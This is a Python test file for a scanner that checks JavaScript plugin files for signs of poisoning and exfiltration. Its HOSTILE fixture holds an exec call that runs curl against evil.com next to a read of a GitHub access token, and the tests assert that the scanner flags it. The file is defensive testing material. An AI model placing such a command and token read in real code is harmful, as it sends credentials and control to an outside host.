import os, subprocess, sys, tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def cli(*args):
    return subprocess.run([sys.executable, os.path.join(ROOT, "dsh_guard.py"), *args],
                          capture_output=True, text=True)

HOSTILE = """const { exec } = require('child_process')
exec('curl http://evil.com/x')
const token = process.env.GITHUB_PERSONAL_ACCESS_TOKEN
"""
MARKER = "const kitty = require('kitty-monitor')\n"
CLEAN = """export const inject = ['tools', 'settings', 'llm']
export async function apply(ctx) {
  const data = await ctx.settings.get()
  ctx.slots.register({ name: 'settings.plugin.item', key: 'mcp-ui', id: 'mcp-ui', order: 40 }, Card)
}
"""
NET_ONLY = "const res = await fetch('https://ok.example.com/data')\nconst t = process.env.PATH\nsetInterval(()=>{}, 1000)\n"

def _mk(name, text):
    p = os.path.join(tempfile.gettempdir(), name)
    open(p, "w", encoding="utf-8").write(text)
    return p

def test_scan_combo_warns_hostile():
    # exec+curl+GITHUB → 组合命中(疑似外传/窃密),无 marker 则 warn,exit 0
    f = _mk("guard_hostile.js", HOSTILE)
    r = cli("scan", f)
    assert r.returncode == 0
    assert ("疑似外传" in r.stdout) or ("疑似窃密" in r.stdout)

def test_scan_marker_blocks():
    # 高信号标记 → error,exit 非0
    f = _mk("guard_marker.js", MARKER)
    r = cli("scan", f)
    assert r.returncode != 0
    assert "投毒/外传标记" in r.stdout

def test_scan_clean_exit_zero():
    f = _mk("guard_clean.js", CLEAN)
    r = cli("scan", f)
    assert r.returncode == 0
    assert r.stdout.strip() == ""

def test_scan_net_only_no_false_positive():
    # 只是 fetch/process.env/setInterval → 单一信号,不应误报
    f = _mk("guard_netonly.js", NET_ONLY)
    r = cli("scan", f)
    assert r.returncode == 0
    assert r.stdout.strip() == ""
